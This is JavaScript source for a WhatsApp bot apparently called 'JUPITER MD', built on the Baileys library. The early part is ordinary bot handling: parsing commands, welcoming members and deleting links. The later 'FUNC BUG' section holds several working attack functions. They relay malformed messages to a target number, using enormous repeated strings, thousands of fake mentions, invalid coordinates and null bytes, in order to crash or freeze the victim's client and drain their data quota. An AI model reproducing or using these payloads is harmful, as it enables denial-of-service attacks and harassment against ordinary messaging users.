/**
   *𝗧𝗛𝗢𝗦𝗘 𝗪𝗛𝗢 𝗦𝗘𝗘𝗞 𝗠𝗬 𝗦𝗖 𝗗𝗠 GODSZEAL
*/
require('./setting/config.js')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const  googleTTS = require('google-tts-api')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./allfunc/storage.js')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
const godszealpic = fs.readFileSync(`./media/image1.jpg`)
const jupiterplay = fs.readFileSync('./media/menu.mp3')

module.exports = gz = async (gz, m, chatUpdate, store) => {
const { from } = m
try {
      
let body = (
    m.mtype === "conversation" ? m.message?.conversation :
    m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :

    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
    m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
    m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :

    m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :


    m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
    m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
    m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
    m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :

    m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                     m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                     "[JUPITER MD]") :
    m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                       m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                       "[JUPITER MD]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                "[JUPITER MD]") :

    m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                      m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                      "[JUPITER MD]") :

    m.mtype === "interactiveMessage" ? "[JUPITER MD]" :

    m.mtype === "protocolMessage" ? "[JUPITER MD]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./allfunc/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./allfunc/premium.json'))
// Ensure body is a string before calling startsWith
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const text = args.join(" ")
const botNumber = await gz.decodeJid(gz.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
let groupMetadata = null;
if (m.isGroup) {
    try {
        groupMetadata = await gz.groupMetadata(from);
    } catch (e) {
        console.error("Failed to get group metadata:", e);
    }
}
const participants = groupMetadata ? groupMetadata.participants : [];
const groupAdmins = participants.length > 0 ? getGroupAdmins(participants) : [];
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Africa/Lagos').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Africa/Lagos',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
// ================== WELCOME AND GOODBYE =================//
//  𝙍𝙊𝙂𝙐𝙀 𝙁𝘼𝙏𝙃𝙀𝙍 𝙊𝙁 𝘼𝙇𝙇  𖠂
// Add to your connection event handlers
const welcomeGroups = new Set();
const goodbyeGroups = new Set();
const welcomeImage = 'https://files.catbox.moe/whyqaw.jpg';
const goodbyeImage = 'https://files.catbox.moe/2j6im0.jpg';
    
gz.ev.on('group-participants.update', async (update) => {
  try {
    // Welcome new members
    if (welcomeGroups.has(update.id) && update.action === 'add') {
      const metadata = await gz.groupMetadata(update.id);
      for (const user of update.participants) {
        await gz.sendMessage(update.id, {
          image: { url: welcomeImage },
          caption: `🎉 Welcome to the chaos@${user.split('@')[0]} Glad you joined\n\nNow try not to get lost in the shadows.\n\nMembers count: ${metadata.participants.length}`,
          mentions: [user]
        });
      }
    }

    // Goodbye leaving members
    if (goodbyeGroups.has(update.id) && update.action === 'remove') {
      const metadata = await gz.groupMetadata(update.id);
      for (const user of update.participants) {
        await gz.sendMessage(update.id, {
          image: { url: goodbyeImage },
          caption: `👋 Goodbye @${user.split('@')[0]}!\n\nDon’t let the 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 catch you slippin’— we *definitely* won’t miss you! 😈🤣!\n\nMembers count: ${metadata.participants.length}`,
          mentions: [user]
        });
      }
    }
  } catch (error) {
    console.error('Group participants update error:', error);
  }
});


let reply = async (teks) => {
    try {
        await gz.sendMessage(m.chat, { 
            text: teks,
            mentions: [sender],
            contextInfo: {
                externalAdReply: {
                    title: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
                    body: pushname || "User",
                    mediaType: 1, // 1 for image, 2 for video, etc.
                    mediaUrl: "https://whatsapp.com/channel/0029VaXKAEoKmCPS6Jz7sw0N",
                    sourceUrl: "https://whatsapp.com/channel/0029VaXKAEoKmCPS6Jz7sw0N",
                    thumbnailUrl: "https://jkgzqdubijffqnwcdqvp.supabase.co/storage/v1/object/public/uploads/Godszeal93.png",
                    showAdAttribution: false,
                    renderLargerThumbnail: true
                }
            }
        });
    } catch (error) {
        console.error("Error sending message:", error);
        // Fallback to simple text message if the rich message fails
        await gz.sendMessage(m.chat, { text: teks, mentions: [sender] });
    }
};

async function loading() {
    var toki = [
        "⌬ 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 SYSTEM BOOTING...]▰▱▱▱▱▱▱▱▱▱ 13% — Establishing encrypted uplink...▰▰▱▱▱▱▱▱▱▱ 29% — Injecting blacklisted protocols...▰▰▰▱▱▱▱▱▱▱ 47% — Overriding system safeguards...▰▰▰▰▱▱▱▱▱▱ 61% — Hijacking runtime environment...▰▰▰▰▰▱▱▱▱▱ 73% — Tracing firewall vulnerabilities...▰▰▰▰▰▰▰▱▱▱ 85% — Unleashing 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 sequences...▰▰▰▰▰▰▰▰▰▰ 100% — ✔ SYSTEM BREACHED: CONTROL ACQUIRED",
         // Fixed template literal
    ];
    
    // Send initial message and capture the response
    let msg = await gz.sendMessage(from, { text: 'ʟᴏᴀᴅɪɴɢ...' });
    
    // Loop through and edit the same message
    for (let i = 0; i < toki.length; i++) {
        await gz.sendMessage(from, {
            text: toki[i],
            edit: msg.key // Use the key from the initial message
        });
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
    }
}
if (autobio) {
            gz.updateProfileStatus(`❱⏤͟͟͞ 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 𝐁𝐘 ❱⏤͟͟͞ 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 `).catch(_ => _)
        }

// Anti-link message handler (runs for every message)
// Anti-link detector (place this where you handle incoming messages)
// Add this OUTSIDE your switch-case block, where you handle incoming messages
// Store anti-link status per group
const antilinkStatus = {};

async function isAdmin(groupId, userId, gz) {
  try {
    // Verify all required parameters exist
    if (!groupId || !userId || !gz?.groupMetadata) {
      console.error('Missing parameters for admin check');
      return false;
    }

    // Get group metadata
    const metadata = await gz.groupMetadata(groupId).catch(() => null);
    if (!metadata?.participants) {
      console.error('Failed to fetch group metadata');
      return false;
    }

    // Find the participant
    const participant = metadata.participants.find(p => p.id === userId);
    
    // Return admin status (supports both 'admin' and 'superadmin' types)
    return participant?.admin === 'admin' || participant?.admin === 'superadmin';
  } catch (e) {
    console.error('Admin check error:', e);
    return false;
  }
}
    async function isGroupAdmin(groupId, userId, gz) {
    try {
        const metadata = await gz.groupMetadata(groupId);
        const participant = metadata.participants.find(p => p.id === userId);
        return participant?.admin === 'admin' || participant?.admin === 'superadmin';
    } catch (error) {
        console.error("Admin check error:", error);
        return false;
    }
}
// Function to handle anti-link feature
async function handleAntiLink() {
    if (!m.isGroup || !antilinkStatus[from] || m.isAdmins) return false;

    // WhatsApp-specific link patterns
    const linkPatterns = [
        /chat\.whatsapp\.com/gi,
        /wa\.me/gi,
        /whatsapp\.com/gi,
        /http?s:\/\/\S+/gi
    ];

    // Extract message text properly
    const messageText = m.message?.conversation || 
                       m.message?.extendedTextMessage?.text || 
                       m.message?.imageMessage?.caption || 
                       '';

    // Check if message contains any links
    const containsLink = linkPatterns.some(pattern => pattern.test(messageText));

    if (containsLink) {
        try {
            // Delete the message (newest Baileys method)
            await gz.sendMessage(from, {
                delete: {
                    id: m.key.id,
                    remoteJid: from,
                    fromMe: false,
                    participant: m.sender
                }
            });
            console.log(`Deleted link message from ${m.sender.split('@')[0]}`);
            return true;
        } catch (error) {
            console.error('Failed to delete message:', error);
            return false;
        }
    }
    return false;
}

// Command handler for anti-link

const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reaction = async (jidss, emoji) => {
    gz.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
    
 //end of code
 if (global.autoReact && global.autoReact[m.chat]) {
    const emojis = [
        "🤐", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🤐", "😠", "🤐", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🤐", "🤐", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ]; // List of emojis to choose from

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji

    try {
        await gz.sendMessage(m.chat, {
            react: {
                text: randomEmoji, // Emoji to react with
                key: m.key,        // Message key to react to
            },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}

// Zenon Quoted 
global.stickerCmds = {};

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363269950668068@newsletter',
    newsletterName: '',
    caption: body
}}}
async function sendImage(imageUrl, caption) {
  gz.sendMessage(m.chat, {
    image: { url: imageUrl },
    caption,
    contextInfo: {
      forwardingScore: 9,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363269950668068@newsletter",
        newsletterName: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
      }
    }
  }, { quoted: m });
}
const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const Godszealtech = "ʀɪᴄʜɪᴇ™";
if (!gz.public) {
if (!isCreator) return
}
const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}
/*
const newsletterJids = ["120363269950668068@newsletter"];

// Extended emoji list for fun & variety
const newsletterEmojis = require('./autoreact.js');

// Utility to pick random emoji fast
const GodszealRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];


gz.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const godszealjid = chatUpdate.messages?.[0];
        if (!godszealjid || godszealjid.key.fromMe) return;

        const sender = godszealjid.key.remoteJid;

        // ✅ Auto-react only to newsletter messages
        if (newsletterJids.includes(sender)) {
            const serverId = godszealjid.newsletterServerId;
            if (serverId) {
                const emoji = GodszealRandom(newsletterEmojis);
                await gz.newsletterReactMessage(sender, serverId.toString(), emoji);
            }
        }

    } catch (err) {
        console.error("❌ Newsletter auto-reaction error:", err);
    }
});
*/
//~~~~~~~~~~~~~~~~~~~ [ FUNC BUG ]~~~~~~~~~
async function YukinaSex(target) {
  let msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
      forwardingScore: 250208,
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: "𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𝑫𝒂",
        body: "YuukeyD'7êppeli",
        previewType: "VIDEO",
        mediaType: "VIDEO",
        thumbnail: null,
        sourceUrl: "https://wa.me/YuukeyD7eppeli",
        mediaUrl: "https://Yuukey.example.com",
        sourceType: " x ",
        sourceId: " x ",
        containsAutoReply: true,
        ctwaClid: "ctwa_clid_example",
        ref: "ref_example"
      },
      quotedAd: {
        advertiserName: " X ",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "𝙴𝚣𝚣 𝙳𝚎𝚟𝚒𝚌𝚎 𝙵𝚘𝚛𝚌𝚎"
      },
      placeholderKey: {
        remoteJid: "13135550002@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
      },
      isSampled: false,
      utm: {
        utmSource: " X ",
        utmCampaign: " X "
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363269950668068@newsletter",
        serverMessageId: 1,
        newsletterName: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
        contentType: "UPDATE",
        accessibilityText: " X "
     },
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net` ), 
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
  }
};
  
  await gz.relayMessage(target, msg, {
    participant: { jid:target }, 
    messageId: null
  });
}

async function VerloadFcVisibleV1(target) {
try {
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "You're beautiful៚",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await gz.relayMessage(target, msg.message, {
     messageId: msg.key?.id,
     participant: { jid: target },
    });

    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 𖤍${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await gz.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });

    const messageVxzXinvis = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "𝐢𝐧𝐜 𝐗𝐎𝐔𝐑𝐂𝐄".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: {
              text: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗𓃱",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await gz.relayMessage(target, messageVxzXinvis, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}


async function CallUi(isTarget) {
  const msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: isTarget,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [isTarget],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "🧬 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 𝗙𝗨𝗖𝗞 𝐔𝐈" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     ""
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     ""
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await gz.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key?.id
  });
}

//BULDOSER KUOTA KURAS
async function bulldozercltyCall(target, Ptcp = true) {
  await gz.relayMessage(target, {
    ephemeralMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "\u0000".repeat(100),
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          contactVcard: true,
          caption: "\u0000".repeat(2000),
          jpegThumbnail: ""
        },
        hasMediaAttachment: true
      },
      body: {
        text: " 𝗜 𝗪𝗜𝗡 𝗦𝗢 𝗨 𝗗𝗜𝗘" + "ꦾ".repeat(60000)
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(9999999),
        buttons: Array(90).fill({
          name: "php_com_json",
          buttonParamsJson: "{".repeat(119000)
        })
      }
    }
  })
}

//DELAY FUNCT BUG
async function delaynew(target, mention) {
    const jumlah = 9741;
    const jumlahMention = 1900;

    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@Whatitsdhes",
                    listType: 2,
                    sections: Array.from({ length: jumlah }, (_, i) => ({
                        title: "꧀".repeat(jumlah),
                        rows: [{ title: `${i + 1}`, id: `${i + 1}` }]
                    })),
                    singleSelectReply: { selectedRowId: "🦖" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: jumlahMention }, () =>
                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: jumlah,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: `${jumlah}@newsletter`,
                            serverMessageId: 1,
                            newsletterName: "⎋𝐑𝐈‌‌‌‌‌‌‌‌‌‌‌‌𝐙𝐗‌‌‌‌‌‌‌‌‌‌‌‌𝐕𝐄𝐋𝐙-‣"
                        }
                    },
                    description: "𐌓𐌉𐌆𐌗𐌅𐌄𐌋𐌆 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});

    await gz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key?.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });

    if (mention) {
        await gz.relayMessage(target, {
            statusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "false" }
            }]
        });
    }
}

async function extrakuota(target) {
  let zxv = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Maklodellay",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000), // di kurngin/ubah ke JSON.stringify({ status: true }) & add native buat fc 
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await gz.relayMessage("status@broadcast", zxv.message, {
    messageId: zxv.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await gz.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: zxv.key,
          type: 25
        }
      }
    }
  },
  {
    additionalNodes: [{
      tag: "meta",
      attrs: { is_status_mention: "true" },
      content: undefined
    }]
  });
      
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
